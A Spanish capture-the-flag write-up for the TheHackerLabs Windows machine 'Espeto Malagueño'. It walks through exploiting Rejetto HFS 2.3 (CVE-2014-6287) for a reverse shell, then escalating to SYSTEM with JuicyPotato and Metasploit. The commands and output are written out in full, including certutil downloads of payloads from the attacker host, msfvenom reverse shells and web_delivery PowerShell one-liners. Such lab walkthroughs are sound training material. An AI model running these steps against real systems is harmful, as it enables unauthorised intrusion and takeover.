---
title: "Espeto Malaqueño - TheHackerLabs"
date: 2025-03-18
draft: false
slug: "THL-writeup-espetoMalaquenio"
excerpt: "Esta fue una máquina sencilla. Después de analizar los escaneos, nos damos cuenta que está activo el servicio Rejetto HFS en el puerto 80, así que lo visitamos y descubrimos la versión que está utilizando. Esto nos ayuda a buscar un Exploit acorde a la versión encontrada, lo que nos permite Explotar este servicio y ganar acceso a la máquina. Una vez dentro, notamos que tenemos el privilegio SeImpersonatePrivilege, lo que nos permite el uso del Exploit Juicy Potato para poder escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "Rejetto HttpFileServer (HFS)", "Remote Command Execution (RCE)", "CVE-2014-6287 (RCE)", "CVE- 2014-6287 (RCE)", "System Recognition (Windows)", "Privesc - Juicy Potato", "Privesc - MS16-075-reflection-juicy", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "searchsploit"
  - "python2"
  - "python3"
  - "cp"
  - "nc.exe"
  - "rlwrap"
  - "nc"
  - "whoami"
  - "certutil.exe"
  - "msfvenom"
  - "JuicyPotato.exe"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: exploit/multi/script/web_delivery"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/ms16_075_reflection_juicy"
links:
  - "https://www.exploit-db.com/exploits/49125"
  - "https://www.exploit-db.com/exploits/39161"
  - "https://github.com/ohpe/juicy-potato"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-espetoMalaguenio/espetoMalaguenio.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 12:27 CST
...
...
Nmap scan report for 192.168.1.180
Host is up (0.00072s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
...
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
...
192.168.1.180	XX	PCS Systemtechnik GmbH
...
```
Encontramos nuestro objetivo y es: `192.168.1.180`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.180
PING 192.168.1.180 (192.168.1.180) 56(84) bytes of data.
64 bytes from 192.168.1.180: icmp_seq=1 ttl=128 time=1.55 ms
64 bytes from 192.168.1.180: icmp_seq=2 ttl=128 time=0.723 ms
64 bytes from 192.168.1.180: icmp_seq=3 ttl=128 time=0.876 ms
64 bytes from 192.168.1.180: icmp_seq=4 ttl=128 time=1.92 ms

--- 192.168.1.180 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3125ms
rtt min/avg/max/mdev = 0.723/1.266/1.923/0.488 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.180 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 12:29 CST
Initiating ARP Ping Scan at 12:29
Scanning 192.168.1.180 [1 port]
Completed ARP Ping Scan at 12:29, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:29
Scanning 192.168.1.180 [65535 ports]
Discovered open port 80/tcp on 192.168.1.180
Discovered open port 139/tcp on 192.168.1.180
Discovered open port 445/tcp on 192.168.1.180
Discovered open port 135/tcp on 192.168.1.180
Discovered open port 49154/tcp on 192.168.1.180
Discovered open port 5985/tcp on 192.168.1.180
Discovered open port 49152/tcp on 192.168.1.180
Discovered open port 49153/tcp on 192.168.1.180
Discovered open port 47001/tcp on 192.168.1.180
Discovered open port 49156/tcp on 192.168.1.180
Discovered open port 49161/tcp on 192.168.1.180
Discovered open port 49155/tcp on 192.168.1.180
Completed SYN Stealth Scan at 12:29, 18.29s elapsed (65535 total ports)
Nmap scan report for 192.168.1.180
Host is up, received arp-response (0.0040s latency).
Scanned at 2025-03-18 12:29:02 CST for 19s
Not shown: 65396 closed tcp ports (reset), 127 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49161/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds
           Raw packets sent: 84714 (3.727MB) | Rcvd: 65409 (2.616MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo varios puertos abiertos, pero curioso que este activo el **puerto 80** y el **puerto 5985**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49161 192.168.1.180 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 12:34 CST
Nmap scan report for 192.168.1.180
Host is up (0.0051s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         HttpFileServer httpd 2.3

|_http-server-header: HFS 2.3
|_http-title: HFS /
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2025-03-18T18:35:21
|_  start_date: 2025-03-18T10:22:22
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-RE8NJPG9K5N, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.98 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

De acuerdo al escaneo, veo que está usando el servicio **Rejetto HFS** en el **puerto 80**, por lo que podemos empezar por ahí. Además, parece que es posible ver los recursos compartidos del **servicio SMB**.

Pero como siempre, empecemos primero por la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-espetoMalaguenio/Captura1.png">
</p>

Como lo había dicho, esto es el **servicio Rejetto HFS**.

A veces, es posible ver la versión de este servicio en la parte inferior y parece que este es el caso:

<p align="center">
<img src="/assets/images/THL-writeup-espetoMalaguenio/Captura2.png">
</p>

Ya con esto, podemos buscar directamente un Exploit para esa versión.

Pues si queremos intentar ver el **servicio SMB**, no mostrará nada.

Así que, busquemos un Exploit para **Rejjeto**.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3) {#Exploit}

Busquemos un Exploit con la herramienta **searchsploit**:
```bash
searchsploit HFS 2.3
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                 | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                 | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                      | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                              | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                         | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                         | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                    | windows/webapps/34852.txt

|---|---|
Shellcodes: No Results
```
Tenemos algunas opciones, pero primero vamos a usar la primera opción.

Vamos a copiarlo en nuestro directorio actual de trabajo:
```bash
searchsploit -m windows/remote/49584.py
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
```
Analizando el Exploit, parece que crea un payload de una conexión mediante **PowerShell** que se va a ejecutar en el **Rejetto HFS** y nos dará una **Reverse Shell**.

Solamente tenemos que poner nuestra IP y un puerto a usar, y luego ponemos la IP de la máquina víctima y el puerto donde se está ejecutando el **Rejetto HFS**:
```python
lhost = "Tu_IP"
lport = 443
rhost = "192.168.1.180"
rport = 80
```

Una vez que lo modifiques, ejecútalo:
```bash
python3 49584.py

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  Tu_IP
lport:  443
rhost:  192.168.1.180
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjA...
Listening for connection...
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.180] 49176

PS C:\Users\hacker\Downloads> whoami
win-re8njpg9k5n\hacker
```
Funciono y estamos dentro.

### Probando Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) {#Exploit2}

Esta es otra opción que podemos utilizar para ganar acceso a la máquina víctima.

Vamos a descargarlo en nuestro directorio actual de trabajo:
```bash
searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
```

Analizando el Exploit, parece que utiliza el **binario nc.exe** para mandarnos una **Reverse Shell**, pero para poder cargarlo, necesitamos tenerlo disponible en un servidor propio:
```bash
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#          You may need to run it multiple times for success!
...
...
...
	ip_addr = "Tu_IP" #local IP address
	local_port = "443" # Local Port number
...
...
```
Modifícalo con tu IP y un puerto que quieras usar.

Ahora, hay que copiar el **binario nc.exe**:
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
```

Levanta un servidor con **Python** en donde tengas el binario:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Abre una **netcat** utilizando **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Y ahora sí, ejecuta el Exploit usando **Python2**:
```bash
python2 39161.py 192.168.1.180 80
```

Revisa la **netcat**:
```batch
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.180] 49181
Microsoft Windows [Versi�n 6.3.9600]
(c) 2013 Microsoft Corporation. Todos los derechos reservados.

C:\Users\hacker\Downloads>whoami
whoami
win-re8njpg9k5n\hacker
```
Otra vez estamos dentro.

Y ya solamente buscamos la flag del usuario:

```batch
C:\Users\hacker\Downloads>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 4410-AF3A

 Directorio de C:\Users\hacker\Downloads

18/03/2025  15:29    <DIR>          .
18/03/2025  15:29    <DIR>          ..
23/06/2024  11:33    <DIR>          %TEMP%
22/06/2024  18:52           760.320 hfs.exe
18/03/2025  13:42            59.392 nc.exe
23/06/2024  11:29                33 user.txt
               3 archivos        819.745 bytes
               3 dirs  41.894.182.912 bytes libres

C:\Users\hacker\Downloads>type user.txt
type user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios con Juicy Potato {#Jpotato}

Si revisamos los privilegios de nuestro usuario, podemos encontrar que tenemos el **privilegio SeImpersonatePrivilege**:
```batch
C:\>whoami /priv
whoami /priv

INFORMACI�N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci�n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                       Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```
Esto quiere decir que es vulnerable a **Juicy Potato**.

Puedes descargarlo de aquí:
* <a href="https://github.com/ohpe/juicy-potato" target="_blank">Repositorio de ohpe: Juicy Potato</a>

Una vez que lo tengas, mándalo a la máquina víctima utilizando **certutil.exe** y un servidor de **Python**:
```batch
C:\Temp>certutil.exe -f -urlcache -split http://Tu_IP/JuicyPotato.exe JuicyPotato.exe
certutil.exe -f -urlcache -split http://Tu_IP/JuicyPotato.exe JuicyPotato.exe
****  En l�nea  ****
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
```
Funciono correctamente.

Ahora, vamos a generar una **Reverse Shell** con **msfvenom** que es la ocuparemos con **Juicy Potato**:
```batch
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Mandemos esta **Reverse Shell** a la máquina víctima:
```batch
C:\Temp>certutil.exe -f -urlcache -split http://Tu_IP/shell.exe shell.exe
certutil.exe -f -urlcache -split http://Tu_IP/shell.exe shell.exe
****  En l�nea  ****
  000000  ...
  01204a
CertUtil: -URLCache comando completado correctamente.
```

Abre otra **netcat** con **rlwrap** usando el mismo puerto que usaste en la **Reverse Shell**:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
```

Ya con todo esto, ejecutemos **Juicy Potato**:
```batch
C:\Temp>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\shell.exe"
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\shell.exe"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Y observa la **netcat**:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.180] 49205
Microsoft Windows [Versi�n 6.3.9600]
(c) 2013 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```
Excelente, ya somos el **Administrador**.

Ya solo tenemos que buscar la flag del admin:
```batch
C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 4410-AF3A

 Directorio de C:\Users\Administrador\Desktop

23/06/2024  11:32    <DIR>          .
23/06/2024  11:32    <DIR>          ..
23/06/2024  11:30                33 root.txt
               1 archivos             33 bytes
               2 dirs  39.756.767.232 bytes libres

C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Y con esto terminamos la máquina.

### Escalando Privilegios con Módulo ms16_075_reflection_juicy de Metasploit {#Metasploit}

Antes de eso, necesitamos saber si la máquina es vulnerable a algún Exploit.

Para esto, primero necesitamos obtener una **sesión de Meterpreter** y para hacerlo, ocuparemos el **módulo web_delivery** que necesita una sesión de **PowerShell**.

#### Obteniendo Sesión de Meterpreter con Módulo web_delivery {#Meterpreter}

Primero, vamos a obtener una sesión de **Meterpreter** con el módulo `exploit/multi/script/web_delivery`:
```bash
msfconsole -q
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) >
```

Vamos a configurarlo:
```bash
msf6 exploit(multi/script/web_delivery) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

Y lo ejecutamos:
```bash
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on Tu_IP:5555 
[*] Using URL: http://Tu_IP:8080/PLN
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBO.................
```

Copia ese comando y ejecútalo en la sesión que tienes activa:
```batch
PS C:\Users\hacker\Downloads> powershell.exe -nop -w hidden -e WwBO
```

Observa el **Metasploit**:
```bash
[*] 192.168.1.180   web_delivery - Delivering AMSI Bypass (1399 bytes)
[*] 192.168.1.180   web_delivery - Delivering Payload (3492 bytes)
[*] Sending stage (177734 bytes) to 192.168.1.180
[*] Meterpreter session 10 opened (Tu_IP:5555 -> 192.168.1.180:49194) at 2025-03-18 16:19:09 -0600

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                      Connection
  --  ----  ----                     -----------                                                                      ----------
  1         meterpreter x86/windows  WIN-RE8NJPG9K5N\hacker @ WIN-RE8NJPG9K5N                                         Tu_IP:5555 -> 192.168.1.180:49194 (192.168.1.180)
```
Listo, ya tenemos una **sesión de Meterpreter**.

#### Utilizando Módulo local_exploit_suggester para Encontrar Vulnerabilidades {#Meterpreter2}

Vamos a buscar a que es vulnerable la máquina con el módulo `post/multi/recon/local_exploit_suggester`.

Carguémoslo y configurémoslo:
```bash
msf6 exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

Ejecutalo:

```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 192.168.1.180 - Collecting local exploits for x86/windows...
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.1.180 - 203 exploit checks are being tried...
...
...
...
[*] Running check method for exploit 42 / 42
[*] 192.168.1.180 - Valid modules for session 10:
=============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```
Hay algunos Exploits que podemos probar.

#### Probando Módulo de Metasploit: exploit/windows/local/ms16_075_reflection_juicy {#Meterpreter3}

Usaremos el módulo `exploit/windows/local/ms16_075_reflection_juicy` para poder escalar privilegios.

Vamos a cargarlo:
```bash
msf6 exploit(windows/local/ms16_075_reflection) > use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) >
```

Lo configuramos:
```bash
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 4848
LPORT => 4848
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
SESSION => 1
```

Y lo ejecutamos:
```bash
msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
[*] Started reverse TCP handler on Tu_IP:4848 
[+] Target appears to be vulnerable (Windows Server 2012 R2)
[*] Launching notepad to host the exploit...
[+] Process 1644 launched.
[*] Reflectively injecting the exploit DLL into 1644...
[*] Injecting exploit into 1644...
[*] Exploit injected. Injecting exploit configuration into 1644...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.180
[*] Meterpreter session 11 opened (Tu_IP -> 192.168.1.180:49199) at 2025-03-18 16:26:48 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Listo, hemos escalado privilegios otra vez.
